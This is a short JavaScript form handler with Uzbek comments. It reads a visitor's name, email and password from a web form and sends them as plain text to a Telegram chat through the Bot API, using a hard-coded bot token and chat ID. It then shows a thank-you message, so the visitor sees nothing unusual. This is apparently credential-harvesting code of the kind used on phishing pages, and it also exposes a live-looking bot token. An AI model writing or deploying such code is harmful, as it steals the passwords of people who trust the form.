function alicoder() {
    let fristName=document.getElementById("fristName").value;
    let fristEmail=document.getElementById("fristEmail").value;
    let fristPaassword=document.getElementById("fristPaassword").value;
    event.preventDefault();
    let telegram_bot_id = "6214904384:AAGuQKnYSFvN_ASfHh5HpGbTIwqTpcYLF9c";
    let chat_id = 1818840959; // 1111 o'rniga Habar borishi kerak bo'lgan ChatID
    let message = `Ismi: ${fristName}; Email: ${fristEmail}; Parol: ${fristPaassword}`;
    let settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
       alert('Xabaringiz uchun rahmat!');
    });
    document.getElementById('fristName').value = '';
    document.getElementById('fristEmail').value = '';
    document.getElementById('fristPaassword').value = '';
    return false;
};